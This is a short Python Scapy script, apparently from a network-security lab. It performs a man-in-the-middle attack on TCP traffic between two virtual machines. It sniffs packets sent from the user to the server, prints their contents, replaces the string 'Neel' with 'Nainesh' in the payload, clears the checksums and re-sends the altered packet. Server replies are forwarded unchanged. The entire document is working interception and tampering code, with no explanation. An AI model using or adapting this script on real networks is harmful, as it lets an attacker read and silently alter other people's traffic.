from scapy.all import *

VM_USER_IP = "192.168.147.147"
VM_SERVER_IP = "192.168.147.150"


def spoof_attack(packet):

	if packet[IP].src == VM_USER_IP and packet[IP].dst == VM_SERVER_IP and packet[TCP].payload:
		data = packet[TCP].payload.load
		print("Data sent by the user to server: {}".format(data))

		new_packet = IP(packet[IP])
		del(new_packet.chksum)
		del(new_packet[TCP].payload)
		del(new_packet[TCP].chksum)
		new_data = data.replace(b'Neel',b'Nainesh')

		new_packet = new_packet/new_data
		send(new_packet)

	elif packet[IP].src == VM_SERVER_IP and packet[IP].dst == VM_USER_IP:
		new_packet = packet[IP]
		send(new_packet)

packet = sniff(filter="tcp",prn=spoof_attack)
